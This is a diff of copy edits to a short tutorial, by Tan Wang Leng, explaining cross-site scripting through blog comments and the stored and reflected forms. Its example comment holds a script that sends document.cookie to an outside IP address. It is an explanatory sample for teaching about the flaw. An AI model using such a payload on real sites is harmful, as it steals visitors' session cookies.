@@ -6,12 +6,12 @@ Author: Tan Wang Leng
 
 Cross site scripting (XSS) is a vulnerability found in websites.
 
-Textboxes are commonly used in forms in websites to ask the user for input. For
-example, blog websites may provide a textbox for user to enter comments.
+Text boxes are commonly used in forms in websites to ask the user for input. For
+example, blog websites may provide a text box for visitors of the blog to enter comments.
 
-However, are they limited to just typing in plain text? For some websites, they
-may not check their input, thus users are able to use formatting HTML tags, such
-as `<b>` for bolding and `<i>` for italic.
+However, are commenters limited to just typing in plain text? Some website do not
+check the input, thus commenters are able to use formatting HTML tags, such
+as `<b>` for bolding and `<i>` for italicizing.
 
 ```html
 I <b>like</b> your blog post!
@@ -19,15 +19,15 @@ I <b>like</b> your blog post!
 
 becomes: I **like** your blog post!
 
-The problem of not checking the user's input is when the user starts using HTML
-for malicious purposes. For example, HTML also supports `<script>`, for you to
-write JavaScript code on the webpage as well.
+The problem arises when the commenter starts using HTML for malicious purposes. For
+example, HTML also supports `<script>`, for you to write JavaScript code on the
+webpage as well.
 
 ```html
 This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
 ```
 
-While any visitors of the blog will only see the non-script portion of the
+While visitors of the blog will only see the non-script portion of the
 comments (i.e. `This is an innocent looking comment.`), the browser will not
 show the script portion of the comment, because it is legal HTML (you won't see
 the tags like `<b>` and `<i>` when viewing webpages, so you definitely won't see
@@ -55,7 +55,7 @@ XSS:
 
 * Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in
 the web server. Example: Posting a malicious JavaScript code into a blog post as
-a comment. The comment gets stored in the database, and future visitors of the
+a comment. The comment gets stored in the database, and the web browser of future visitors of the
 webpage will retrieve the comment from the database, resulting in execution.
 
 * Non-persistent XSS (also known as reflected XSS) - The JavaScript code is
